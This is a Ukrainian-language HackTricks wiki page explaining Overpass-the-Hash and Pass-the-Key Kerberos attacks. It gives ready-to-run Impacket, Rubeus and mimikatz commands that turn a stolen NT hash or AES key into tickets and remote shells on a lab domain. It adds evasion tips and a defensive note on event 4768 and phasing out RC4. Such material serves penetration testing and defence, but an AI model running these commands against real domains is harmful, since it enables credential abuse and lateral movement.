# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Атака **Overpass The Hash/Pass The Key (PTK)** призначена для середовищ, де традиційний протокол NTLM обмежений, а автентифікація Kerberos має пріоритет. Ця атака використовує NTLM hash або AES keys користувача для отримання Kerberos tickets, забезпечуючи несанкціонований доступ до ресурсів у мережі.

Строго кажучи:

- **Over-Pass-the-Hash** зазвичай означає перетворення **NT hash** на Kerberos TGT за допомогою Kerberos key **RC4-HMAC**.
- **Pass-the-Key** — це більш загальний варіант, коли у вас уже є Kerberos key, наприклад **AES128/AES256**, і ви безпосередньо запитуєте TGT за його допомогою.

Ця відмінність важлива в hardened environments: якщо **RC4 вимкнено** або KDC більше не використовує його за замовчуванням, одного **NT hash** недостатньо, і вам потрібен **AES key** (або пароль у cleartext, щоб отримати його).

Щоб виконати цю атаку, спочатку потрібно отримати NTLM hash або пароль облікового запису цільового користувача. Отримавши цю інформацію, можна отримати Ticket Granting Ticket (TGT) для облікового запису, що дасть зловмиснику змогу отримати доступ до services або machines, для яких користувач має дозволи.

Процес можна розпочати за допомогою таких команд:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Для сценаріїв, що потребують AES256, можна використати опцію `-aesKey [AES key]`:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` також підтримує безпосередній запит **service ticket через AS-REQ** за допомогою `-service <SPN>`, що може бути корисним, якщо вам потрібен ticket для певного SPN без додаткового TGS-REQ:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Крім того, отриманий ticket можна використовувати з різними tools, зокрема `smbexec.py` або `wmiexec.py`, розширюючи масштаб атаки.

Такі помилки, як _PyAsn1Error_ або _KDC cannot find the name_, зазвичай усуваються шляхом оновлення бібліотеки Impacket або використання hostname замість IP-адреси, що забезпечує сумісність із Kerberos KDC.

Альтернативна послідовність команд із використанням Rubeus.exe демонструє інший аспект цієї техніки:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Цей метод повторює підхід **Pass the Key**, зосереджуючись на заволодінні квитком і безпосередньому використанні його для автентифікації. На практиці:

- `Rubeus asktgt` сам надсилає **raw Kerberos AS-REQ/AS-REP** і не потребує прав адміністратора, якщо тільки ви не хочете націлитися на інший сеанс входу за допомогою `/luid` або створити окремий сеанс за допомогою `/createnetonly`.
- `mimikatz sekurlsa::pth` впроваджує матеріал облікових даних у сеанс входу й тому взаємодіє з **LSASS**, що зазвичай потребує локальних прав адміністратора або `SYSTEM` і є більш помітним з погляду EDR.

Приклади з Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Для дотримання вимог операційної безпеки та використання AES256 можна застосувати таку команду:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` є релевантним, оскільки traffic, згенерований Rubeus, дещо відрізняється від native Windows Kerberos. Також зверніть увагу, що `/opsec` призначений для traffic **AES256**; його використання з RC4 зазвичай потребує `/force`, що нівелює значну частину задуму, оскільки **RC4 у сучасних доменах сам по собі є сильним індикатором**.

## Нотатки щодо виявлення

Кожен TGT request генерує **event `4768`** на DC. У поточних збірках Windows ця подія містить більше корисних полів, ніж згадується у старих матеріалах:

- `TicketEncryptionType` показує, який enctype було використано для виданого TGT. Типові значення: `0x17` для **RC4-HMAC**, `0x11` для **AES128** і `0x12` для **AES256**.<sup>[[3]](#references)</sup>
- Оновлені events також містять `SessionKeyEncryptionType`, `PreAuthEncryptionType` і enctypes, оголошені клієнтом, що допомагає відрізнити **реальну залежність від RC4** від оманливих legacy defaults.
- Наявність `0x17` у сучасному середовищі є хорошою ознакою того, що account, host або KDC fallback path усе ще дозволяє RC4 і тому є сприятливішим для Over-Pass-the-Hash на основі NT-хеша.

Починаючи з листопадових оновлень Kerberos hardening 2022 року, Microsoft поступово зменшує використання RC4 за замовчуванням, а поточні опубліковані рекомендації передбачають **видалити RC4 як assumed enctype за замовчуванням для AD DC до кінця Q2 2026 року**. З offensive perspective це означає, що **Pass-the-Key з AES** дедалі частіше буде надійним шляхом, тоді як класичний **OpTH лише з NT-хешем** дедалі частіше не працюватиме у hardened environments.<sup>[[3]](#references)</sup>

Докладнішу інформацію про Kerberos encryption types і пов’язану з ними ticketing behaviour дивіться тут:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Кожен logon session може мати лише один активний TGT, тому будьте обережні.

1. Створіть новий logon session за допомогою **`make_token`** у Cobalt Strike.
2. Потім використайте Rubeus для генерації TGT для нового logon session, не впливаючи на наявний.

Подібної ізоляції можна досягти безпосередньо за допомогою Rubeus, використовуючи sacrificial session **logon type 9**:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Це не перезаписує поточний TGT сеансу та зазвичай є безпечнішим, ніж імпортування квитка до наявного сеансу входу.

## Посилання

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Виявлення та усунення використання RC4 у Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
